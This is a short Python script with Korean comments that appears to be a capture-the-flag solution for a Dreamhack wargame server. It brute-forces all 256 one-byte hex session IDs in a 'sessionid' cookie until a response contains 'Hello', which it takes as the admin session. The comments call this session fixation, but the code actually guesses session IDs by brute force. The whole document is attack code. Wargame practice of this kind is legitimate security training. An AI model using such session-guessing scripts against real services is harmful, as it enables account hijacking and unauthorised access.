import requests

# 타겟 서버 URL (로그인 페이지 또는 플래그를 얻을 수 있는 페이지)
target_url = 'http://host3.dreamhack.games:22456//'  # 타겟 서버 주소를 여기에 입력

# 서버에 미리 고정된 세션 ID를 전송하여 session_storage를 수정하려는 시도
def session_fixation_attack():
    # 관리자 세션을 추측하기 위한 가능한 세션 ID들 (256개의 경우)
    for i in range(256):
        # 세션 ID를 16진수 문자열로 변환
        session_id = bytes([i]).hex()

        # 세션 ID를 고정한 상태에서 요청을 보내기 위해 쿠키 설정
        cookies = {'sessionid': session_id}

        # 서버에 요청을 보냄 (GET 요청으로 세션이 고정된 상태를 확인)
        response = requests.get(target_url, cookies=cookies)

        # 서버 응답 내용에서 'Hello'나 관리자 권한 확인
        if 'Hello' in response.text:
            print(f'Success! Found admin session ID: {session_id}')
            break
        else:
            print(f'Tried session ID: {session_id}, but not admin.')

# 공격 실행
session_fixation_attack()
